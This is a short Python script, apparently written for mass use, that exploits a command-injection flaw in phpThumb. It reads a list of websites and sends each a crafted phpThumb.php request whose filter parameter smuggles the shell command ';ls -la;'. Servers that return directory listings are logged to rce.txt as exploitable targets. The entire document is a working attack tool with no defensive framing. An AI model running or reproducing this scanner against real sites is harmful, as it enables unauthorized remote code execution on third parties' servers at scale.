# Mass phpThumb Command Injection
# Author : Angga1337

import requests
from threading import Thread
from colorama import Fore

def exploit():
    nanyaWeb = input('Weblist: ')
    openWeb = open(nanyaWeb, 'r')
    for url in openWeb.readlines():
        urls = url.replace('\n', '')
        try:
            r = requests.get(urls+'/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg ;ls -la; &phpThumbDebug=9')
            if "drwxr" in r.text:
                print(' {} --> {}VULN!{}'.format(urls,Fore.GREEN,Fore.WHITE))
                saverce = open('rce.txt', 'a')
                saverce.write(urls+'/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg ;ls -la; &phpThumbDebug=9\n')
            else:
                print(' {} --> {}NOT VULN!{}'.format(urls,Fore.RED,Fore.WHITE))
        except:
            print(' {} --> {}WEBSITE DIE{}'.format(urls,Fore.RED,Fore.WHITE))

T = Thread(target=exploit)
T.start()
